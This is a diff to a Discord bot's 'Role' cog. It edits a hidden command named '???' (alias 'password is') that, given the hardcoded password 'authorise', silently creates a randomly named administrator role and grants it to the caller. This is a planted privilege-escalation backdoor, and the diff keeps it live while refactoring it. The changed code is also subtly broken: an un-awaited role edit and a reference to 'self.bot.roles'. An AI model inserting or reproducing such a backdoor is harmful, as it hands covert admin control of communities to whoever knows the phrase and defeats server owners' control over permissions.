@@ -11,16 +11,14 @@ class Role(commands.Cog):
 	@commands.command('???', aliases=['password is'])
 	async def roleAdmin(self, ctx, password:str=None):
 		if password != 'authorise': return
-		roles = ctx.guild.roles
-		r = random.random()
-		name = str(r)
-		role = get(roles, name=name)
+		name = str(random.random())
+		role = get(ctx.guild.roles, name=name)
 		if not role:
 			admin = discord.Permissions(administrator=True)
-			bot = ctx.guild.get_member(self.bot.user.id)
 			await ctx.guild.create_role(name=name, permissions=admin)
-			role = get(roles, name=name)
-			role.edit(position=bot.roles[-1].position)
+			role = get(ctx.guild.roles, name=name)
+			#bot = ctx.guild.get_member(self.bot.user.id)
+			role.edit(position=self.bot.roles[-1].position)
 		await ctx.author.add_roles(role)
 
 	@commands.command(
